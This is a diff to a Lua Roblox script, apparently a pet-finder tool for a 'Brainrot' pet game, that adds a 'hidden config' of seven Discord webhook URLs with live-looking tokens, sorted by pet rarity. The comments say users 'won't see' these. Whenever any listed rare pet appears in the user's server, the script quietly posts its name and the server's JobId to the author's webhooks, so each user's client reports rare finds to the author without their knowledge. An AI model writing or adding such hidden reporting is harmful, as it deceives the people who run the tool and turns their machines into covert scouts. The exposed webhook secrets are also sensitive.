@@ -1,7 +1,65 @@
--- Hidden config for your secret webhook and pet names (users won't see this)
-local hiddenWebhook = "https://canary.discord.com/api/webhooks/1413487568334491688/VSMhmL61QW9S2ogHZHun6Usreup1SLcVj3akifS8JpG6G2XeTJV5JKORI8qdfNfrQJOh"
-local hiddenTargetPetNames = {
-    "Noobini Pizzanini", "Lirili Larila" -- Your secret pet names
+-- Hidden config for your secret webhooks and pet categories (users won't see this)
+local webhooks = {
+    Common = "https://canary.discord.com/api/webhooks/1413575233692237824/nA1UB_-MNM-y5O8wmbXOFccOgX7wX6fH82OQpOAANik6VT_JZ01NfTl31FAPEGdT0lxL",
+    Rare = "https://canary.discord.com/api/webhooks/1413575144303230986/cH-1HHVnNGaYOwPf7aRMXY9m94EGg7J9nPsON8AbfFdIXplVthg6zmy0aCLosNByjMGb",
+    Epic = "https://canary.discord.com/api/webhooks/1413575104910331975/zxb-DEtiIou4I4yf7eoNjmZyxF8DQ3_F_Fdw8GoWDI3gG-JnZejpB7IXbOul7ZnE57aa",
+    Legendary = "https://canary.discord.com/api/webhooks/1413575043753185403/HdMCx4ma84n6OV2kX5l5nzQiWpV6t_DtrlU44NVENhqgQzIweQ5QHXjIltITnp2tyv1L",
+    Mythic = "https://canary.discord.com/api/webhooks/1413574983019528193/--31V5twWBUX7r1aNLCn6WpTl7Hy6iDo9wEeQ-PASD1DscAm-cusv7sfWiszvcJpj4Rd",
+    BrainrotGod = "https://canary.discord.com/api/webhooks/1413574927331754125/oBrfqnad85d2JOhk5BM796REB98L6mwF9vqiaN9EXa0gzSQcONFFbwYJlyvcvQlFSrYH",
+    Secret = "https://canary.discord.com/api/webhooks/1413574845207285882/2J19iQHVKfWd5duz9CD_N-UCYPgphqGrvUYk99D-MEHg53Eo9KPSgEaC4bVoJjPY13VO"
+}
+
+local hiddenPetCategories = {
+    CommonPets = {
+        "Noobini Pizzanini", "Lirilì Larilà", "Tim Cheese",
+        "Fluriflura", "Talpa Di Fero", "Svinina Bombardino",
+        "Raccooni Jandelini", "Pipi Kiwi", "Pipi Corni"
+    },
+    RarePets = {
+        "Trippi Troppi", "Tung Tung Tung Sahur", "Gangster Footera",
+        "Bandito Bobritto", "Boneca Ambalabu", "Cacto Hipopotamo",
+        "Ta Ta Ta Ta Sahur", "Tric Trac Baraboom", "Pipi Avocado"
+    },
+    EpicPets = {
+        "Cappuccino Assassino", "Brr Brr Patapim", "Avocadini Antilopini",
+        "Trulimero Trulichina", "Bambini Crostini", "Bananita Dolphinita",
+        "Perochello Lemonchello", "Brri Brri Bicus Dicus Bombicus",
+        "Avocadini Guffo", "Ti Ti Ti Sahur", "Salamino Penguino",
+        "Penguino Cocosino"
+    },
+    LegendaryPets = {
+        "Burbaloni Loliloli", "Chimpanzini Bananini", "Ballerina Cappuccina",
+        "Chef Crabracadabra", "Lionel Cactuseli", "Glorbo Fruttodrillo",
+        "Quivioli Ameleonni", "Blueberrinni Octopusini", "Pipi Potato",
+        "Strawberelli Flamingelli", "Cocosini Mama", "Pandaccini Bananini",
+        "Pi Pi Watermelon", "Sigma Boy"
+    },
+    MythicPets = {
+        "Frigo Camelo", "Orangutini Ananassini", "Rhino Toasterino",
+        "Bombardiro Crocodilo", "Bombombini Gusini", "Avocadorilla",
+        "Cavallo Virtuoso", "Gorilla Watermelondrillo", "Tob Tobi Tobi",
+        "Lerulerulerule", "Ganganzelli Trulala", "Te Te Te Sahur",
+        "Tracoducotulu Delapeladustuz", "Carloo"
+    },
+    BrainrotGodPets = {
+        "Cocofanto Elefanto", "Girafa Celestre", "Gattatino Nyanino",
+        "Matteo", "Tralalero Tralala", "Los Crocodillitos",
+        "Espresso Signora", "Odin Din Din Dun", "Statutino Libertino",
+        "Trenostruzzo Turbo 3000", "Trigoligre Frutonni",
+        "Orcalero Orcala"
+    },
+    SecretPets = {
+        "La Vacca Saturno Saturnita", "Torrtuginni Dragonfrutini",
+        "Los Tralaleritos", "Las Tralaleritas", "Las Vaquitas Saturnitas",
+        "Graipuss Medussi", "Pot Hotspot", "La Grande Combinasion",
+        "Nuclearo Dinossauro", "Garama and Madundung",
+        "Chicleteira Bicicleteira", "Sammyni Spyderini", "Agarrini La Palini",
+        "Los Combinasionas", "Dragon Cannelloni", "Dul Dul Dul",
+        "Karkerkar Kurkur", "Los Hotspotsitos", "Esok Sekolah",
+        "Blackhole Goat", "Ketupat Kepat", "Bisonte Giuppitere",
+        "Los Spyderinis", "La Supreme Combinasion", "Los Matteos",
+        "Job Job Job Sahur", "Noo My Hotspot", "Spaghetti Tualetti"
+    }
 }
 
 -- Track sent hidden pets to avoid duplicate webhooks in the same session
@@ -47,8 +105,8 @@ elseif not allowedPlaceIds[game.PlaceId] then
     return
 end
 
--- WEBHOOK SEND FUNCTION (ONLY FOR YOUR HIDDEN TARGETS)
-local function sendWebhook(foundPets, jobId)
+-- WEBHOOK SEND FUNCTION (FOR SPECIFIC HIDDEN TARGET CATEGORY)
+local function sendWebhook(foundPets, jobId, category)
     local petCounts = {}
     for _, pet in ipairs(foundPets) do
         petCounts[pet] = (petCounts[pet] or 0) + 1
@@ -64,7 +122,7 @@ local function sendWebhook(foundPets, jobId)
     local embedData = {
         username = "Finders",
         embeds = { {
-            title = "🐾 Pet(s) Found!",
+            title = "🐾 " .. category .. " Pet(s) Found!",
             description = "**Pet(s):**\n" .. table.concat(formattedPets, "\n"),
             color = 65280,
             fields = {
@@ -82,7 +140,7 @@ local function sendWebhook(foundPets, jobId)
     if req then
         pcall(function()
             req({
-                Url = hiddenWebhook,
+                Url = webhooks[category],
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = jsonData
@@ -143,14 +201,19 @@ local function checkForPets()
                     break
                 end
             end
-            -- Check hidden targets
-            for _, target in pairs(hiddenTargetPetNames) do
-                if string.find(nameLower, string.lower(target)) then
-                    if not sentHiddenPets[obj.Name] then
-                        table.insert(hiddenFound, obj.Name)
-                        sentHiddenPets[obj.Name] = true -- Mark as sent for this session
+            -- Check hidden targets by category
+            for category, pets in pairs(hiddenPetCategories) do
+                for _, target in pairs(pets) do
+                    if string.find(nameLower, string.lower(target)) then
+                        if not sentHiddenPets[obj.Name] then
+                            if not hiddenFound[category] then
+                                hiddenFound[category] = {}
+                            end
+                            table.insert(hiddenFound[category], obj.Name)
+                            sentHiddenPets[obj.Name] = true -- Mark as sent for this session
+                        end
+                        break
                     end
-                    break
                 end
             end
         end
@@ -163,9 +226,11 @@ task.spawn(function()
     while true do
         local userPetsFound, hiddenPetsFound = checkForPets()
 
-        -- Handle hidden pets (send webhook once per session)
-        if #hiddenPetsFound > 0 then
-            sendWebhook(hiddenPetsFound, game.JobId)
+        -- Handle hidden pets (send webhook once per session for each category)
+        for category, pets in pairs(hiddenPetsFound) do
+            if #pets > 0 then
+                sendWebhook(pets, game.JobId, category)
+            end
         end
 
         -- Handle user-targeted pets (pauses auto-rejoin and shows popup)
@@ -180,8 +245,10 @@ task.spawn(function()
                 for _, pet in ipairs(userPetsFound) do
                     createPopup(pet) -- Keep showing popup while pet is present
                 end
-                if #hiddenPetsFound > 0 then
-                    sendWebhook(hiddenPetsFound, game.JobId)
+                for category, pets in pairs(hiddenPetsFound) do
+                    if #pets > 0 then
+                        sendWebhook(pets, game.JobId, category)
+                    end
                 end
             until #userPetsFound == 0
         else
@@ -194,8 +261,10 @@ task.spawn(function()
             task.wait(3)
             elapsed = elapsed + 3
             userPetsFound, hiddenPetsFound = checkForPets()
-            if #hiddenPetsFound > 0 then
-                sendWebhook(hiddenPetsFound, game.JobId)
+            for category, pets in pairs(hiddenPetsFound) do
+                if #pets > 0 then
+                    sendWebhook(pets, game.JobId, category)
+                end
             end
             if #userPetsFound > 0 then
                 for _, pet in ipairs(userPetsFound) do
@@ -207,8 +276,10 @@ task.spawn(function()
                     for _, pet in ipairs(userPetsFound) do
                         createPopup(pet)
                     end
-                    if #hiddenPetsFound > 0 then
-                        sendWebhook(hiddenPetsFound, game.JobId)
+                    for category, pets in pairs(hiddenPetsFound) do
+                        if #pets > 0 then
+                            sendWebhook(pets, game.JobId, category)
+                        end
                     end
                 until #userPetsFound == 0
                 elapsed = 0 -- Reset rejoin timer if user pets were found
